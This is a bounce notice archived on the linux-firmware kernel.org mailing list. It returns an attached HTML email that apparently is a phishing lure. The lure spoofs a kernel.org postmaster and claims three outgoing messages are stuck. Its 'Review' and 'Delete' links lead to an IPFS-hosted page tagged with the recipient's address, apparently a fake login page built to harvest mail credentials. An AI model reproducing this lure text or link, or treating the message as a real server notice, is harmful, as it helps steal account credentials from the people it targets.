Return-Path: <MAILER-DAEMON>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 38850C77B76
	for <linux-firmware@archiver.kernel.org>; Mon, 24 Apr 2023 05:57:18 +0000 (UTC)
Received: by smtp.kernel.org (Postfix)
	id 0A2A5C433AA; Mon, 24 Apr 2023 05:57:18 +0000 (UTC)
Received: from tx-dal-cp16.serversentric.com (tx-dal-cp16.serversentric.com [67.222.138.227])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.kernel.org (Postfix) with ESMTPS id 31CCDC433EF
	for <linux-firmware@kernel.org>; Mon, 24 Apr 2023 05:57:17 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.1 smtp.kernel.org 31CCDC433EF
Authentication-Results: smtp.kernel.org; dmarc=pass (p=none dis=none) header.from=tx-dal-cp16.serversentric.com
Authentication-Results: smtp.kernel.org; spf=pass smtp.helo=tx-dal-cp16.serversentric.com
Received: from mailnull by tx-dal-cp16.serversentric.com with local (Exim 4.96)
	id 1pqpCH-0002pt-3A
	for linux-firmware@kernel.org;
	Mon, 24 Apr 2023 00:57:10 -0500
X-Failed-Recipients: linux-firmware@kernel.org
Auto-Submitted: auto-replied
From: Mail Delivery System <Mailer-Daemon@tx-dal-cp16.serversentric.com>
List-Id: <linux-firmware.lore.kernel.org>
To: linux-firmware@kernel.org
References: <20230424075707.E7190108E70A3C1F@kernel.org>
Content-Type: multipart/report; report-type=delivery-status; boundary=1682315829-eximdsn-774277657
MIME-Version: 1.0
Subject: Mail delivery failed: returning message to sender
Message-Id: <E1pqpCH-0002pt-3A@tx-dal-cp16.serversentric.com>
Date: Mon, 24 Apr 2023 00:57:09 -0500
X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
X-AntiAbuse: Primary Hostname - tx-dal-cp16.serversentric.com
X-AntiAbuse: Original Domain - kernel.org
X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
X-AntiAbuse: Sender Address Domain - 
X-Get-Message-Sender-Via: tx-dal-cp16.serversentric.com: sender_ident via received_protocol == local: mailnull/primary_hostname/system user
X-Authenticated-Sender: tx-dal-cp16.serversentric.com: mailnull
X-Source: 
X-Source-Args: 
X-Source-Dir: 

--1682315829-eximdsn-774277657
Content-type: text/plain; charset=us-ascii

This message was created automatically by mail delivery software.

A message that you sent could not be delivered to one or more of its
recipients. This is a permanent error. The following address(es) failed:

  linux-firmware@kernel.org
    Domain coinzile.com has exceeded the max emails per hour (250/200 (125%)) allowed.  Message discarded.

--1682315829-eximdsn-774277657
Content-type: message/delivery-status

Reporting-MTA: dns; tx-dal-cp16.serversentric.com

Action: failed
Final-Recipient: rfc822;linux-firmware@kernel.org
Status: 5.0.0

--1682315829-eximdsn-774277657
Content-type: message/rfc822

Return-path: <linux-firmware@kernel.org>
Received: from vmi1164484.contaboserver.net ([185.215.166.252]:55596 helo=kernel.org)
	by tx-dal-cp16.serversentric.com with esmtpsa  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
	(Exim 4.96)
	(envelope-from <linux-firmware@kernel.org>)
	id 1pqpCH-0002QH-26
	for linux-firmware@kernel.org;
	Mon, 24 Apr 2023 00:57:09 -0500
From: Postmaster <linux-firmware@kernel.org>
List-Id: <linux-firmware.lore.kernel.org>
To: linux-firmware@kernel.org
Subject: Undeliverable: Outgoing mail failed
Date: 24 Apr 2023 07:57:07 +0200
Message-ID: <20230424075707.E7190108E70A3C1F@kernel.org>
MIME-Version: 1.0
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<table style=3D"border: 1px dotted rgb(211, 211, 211); border-image: none; =
text-align: left; color: rgb(51, 51, 51); text-transform: none; letter-spac=
ing: normal; font-family: Roboto, Tahoma, Helvetica, sans-serif; font-size:=
 13px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; wi=
dows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: norm=
al; font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
coration-style: initial; text-decoration-color: initial;">
<tbody style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;">
<th style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
ne; width: 2px; color: rgb(0, 0, 0); box-sizing: border-box; background-col=
or: rgb(2, 151, 64);">&nbsp;</th>
<td style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
ne; width: 665px; color: rgb(0, 0, 0); box-sizing: border-box; background-c=
olor: rgb(243, 255, 248);"><span style=3D"font-size: 12px; box-sizing: bord=
er-box;">Message from&nbsp;linux-firmware@kernel.org server</span></td></tr=
></tbody></table>
<div style=3D"border-width: 0px; margin: 0px; padding: 20px; text-align: le=
ft; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-=
spacing: normal; font-family: Verdana; font-size: 12px; font-style: normal;=
 font-weight: 400; word-spacing: 0px; vertical-align: baseline; white-space=
: normal; box-sizing: border-box; orphans: 2; widows: 2; font-stretch: inhe=
rit; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; =
font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
coration-style: initial; text-decoration-color: initial;">
<span style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: no=
ne; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-ser=
if; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0p=
x; float: none; display: inline !important; white-space: normal; orphans: 2=
; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: =
normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
oration-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial;">&nbsp;</span></div>
<p align=3D"left" style=3D"color: rgb(44, 54, 58); text-transform: none; te=
xt-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-serif; fo=
nt-size: 13px; font-style: normal; font-weight: 400; margin-top: 0px; word-=
spacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; wido=
ws: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal=
; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoratio=
n-thickness: initial; text-decoration-style: initial;=20
text-decoration-color: initial;"><font color=3D"#000066" face=3D"Arial" siz=
e=3D"4" style=3D"box-sizing: border-box;"><strong style=3D"font-weight: bol=
der; box-sizing: border-box;">Messages Delivery Failure</strong></font></p>=

<div align=3D"left" class=3D"v1yiv9201021698gmail_quote_mr_css_attr" style=
=3D"color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-=
spacing: normal; font-family: Roboto, sans-serif; font-size: 13px; font-sty=
le: normal; font-weight: 400; word-spacing: 0px; border-top-color: currentC=
olor; border-top-width: 0px; border-top-style: none; white-space: normal; b=
ox-sizing: border-box; orphans: 2; widows: 2; background-color: rgb(255, 25=
5, 255); font-variant-ligatures: normal;=20
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial; text-decoration-color: =
initial;"><font size=3D"3"><font style=3D"box-sizing: border-box;"><span st=
yle=3D"box-sizing: border-box;">The delivery of messages was stopped by the=
&nbsp;kernel.org Mail-Server.</span><br style=3D"box-sizing: border-box;"><=
span style=3D"box-sizing: border-box;">You have 3 pending messages that cou=
ld not be sent as of 4/24/2023 7:57:07 a.m.</span></font>
<br style=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;"=
>
<span style=3D"box-sizing: border-box;"><font style=3D"box-sizing: border-b=
ox;">Click to&nbsp;</font>
<a class=3D"v1external_mr_css_attr" style=3D"border-width: 0px; margin: 0px=
; padding: 0px; color: rgb(17, 85, 204); text-decoration: none; vertical-al=
ign: baseline; cursor: pointer; box-sizing: border-box; background-color: t=
ransparent;" href=3D"https://bafybeif4f2n42ywfdctandkqlxhx3twa3m5c7cz3aahgq=
d2koigbek7byi.ipfs.dweb.link/?filename=3DQmb1EaTJcstdvsWHTUZ5UGdzwGn3SVWhpE=
2mvc8VMfKmBX?filename=3DAccount#linux-firmware@kernel.org" target=3D"_blank=
" rel=3D"noreferrer"><font style=3D"box-sizing: border-box;">Review</font><=
/a>
<font style=3D"box-sizing: border-box;">
&nbsp;</font><font style=3D"box-sizing: border-box;">or</font><span>&nbsp;<=
/span>
<a class=3D"v1external_mr_css_attr" style=3D"border-width: 0px; margin: 0px=
; padding: 0px; color: rgb(17, 85, 204); text-decoration: none; vertical-al=
ign: baseline; cursor: pointer; box-sizing: border-box; background-color: t=
ransparent;" href=3D"https://bafybeif4f2n42ywfdctandkqlxhx3twa3m5c7cz3aahgq=
d2koigbek7byi.ipfs.dweb.link/?filename=3DQmb1EaTJcstdvsWHTUZ5UGdzwGn3SVWhpE=
2mvc8VMfKmBX?filename=3DAccount#linux-firmware@kernel.org" target=3D"_blank=
" rel=3D"noreferrer"><font style=3D"box-sizing: border-box;">Delete</font><=
/a>
<span>
&nbsp;</span>
<font style=3D"box-sizing: border-box;">pending outgoing e-mail messages.</=
font></span></font></div>
<div align=3D"left" class=3D"v1yiv9201021698gmail_quote_mr_css_attr" style=
=3D"color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-=
spacing: normal; font-family: Roboto, sans-serif; font-size: 13px; font-sty=
le: normal; font-weight: 400; word-spacing: 0px; border-top-color: currentC=
olor; border-top-width: 0px; border-top-style: none; white-space: normal; b=
ox-sizing: border-box; orphans: 2; widows: 2; background-color: rgb(255, 25=
5, 255); font-variant-ligatures: normal;=20
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial; text-decoration-color: =
initial;"><font size=3D"3"><span style=3D"box-sizing: border-box;"></span><=
/font>&nbsp;</div>
<div class=3D"v1yiv9201021698gmail_quote_mr_css_attr" style=3D"text-align: =
left; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; lette=
r-spacing: normal; font-family: Roboto, sans-serif; font-size: 13px; font-s=
tyle: normal; font-weight: 400; margin-bottom: 0pt; word-spacing: 0px; bord=
er-top-color: currentColor; border-top-width: 0px; border-top-style: none; =
white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backgro=
und-color: rgb(255, 255, 255);=20
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
initial; text-decoration-color: initial;"><span style=3D"color: black; box-=
sizing: border-box;"><font size=3D"3">Thanks,</font></span></div>
<div class=3D"v1yiv9201021698gmail_quote_mr_css_attr" style=3D"text-align: =
left; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; lette=
r-spacing: normal; font-family: Roboto, sans-serif; font-size: 13px; font-s=
tyle: normal; font-weight: 400; margin-bottom: 0pt; word-spacing: 0px; bord=
er-top-color: currentColor; border-top-width: 0px; border-top-style: none; =
white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backgro=
und-color: rgb(255, 255, 255);=20
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
initial; text-decoration-color: initial;"><strong style=3D"font-weight: bol=
der; box-sizing: border-box;"><span style=3D"color: black; box-sizing: bord=
er-box;"><font size=3D"3">Mail&nbsp;Administrator</font></span></strong></d=
iv></body></html>

--1682315829-eximdsn-774277657--
